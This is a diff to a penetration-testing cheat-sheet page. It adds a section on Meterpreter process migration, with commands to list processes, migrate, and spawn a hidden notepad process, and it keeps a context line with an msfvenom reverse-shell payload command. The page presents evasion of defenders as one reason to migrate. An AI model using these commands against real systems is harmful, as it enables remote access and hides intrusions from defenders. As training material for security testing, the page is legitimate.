@@ -86,3 +86,38 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<LPORT> -f exe -o fil
 {{< hint style=notes >}}
 **Note**: To handle a staged payload don't use netcat. Use Metasploit’s `multi/handler` instead.
 {{< /hint >}}
+
+---
+
+## Migrate (meterpreter)
+
+Reason to migrate:
+When a host is compromised, the Meterpreter payload runs inside the process used for exploitation. 
+* **Stability**: If that process is closed, your access is lost
+* **Avoid detection**: The process name may also appear suspicious to defenders
+* **Compatibility**: The payload may be 64-bit, but the session is on an 86-bit OS
+
+To avoid this, we can use `migrate` to move the payload to a more stable or inconspicuous process.
+
+{{< hint style=notes >}}
+**Note**: Migration is only allowed to processes with the same or lower integrity and privilege level.
+{{< /hint >}}
+
+```sh
+# Show list process
+meterpreter > ps
+
+# Migrate
+meterpreter > migrate 8052
+```
+
+If no suitable process is available for migration, we can use the execute command to create a new process and run the Meterpreter payload within it by specifying a desired command or program.
+
+```sh
+# Create a hidden process
+meterpreter > execute -H -f notepad
+
+# Migrate
+meterpreter > migrate 8052
+```
+
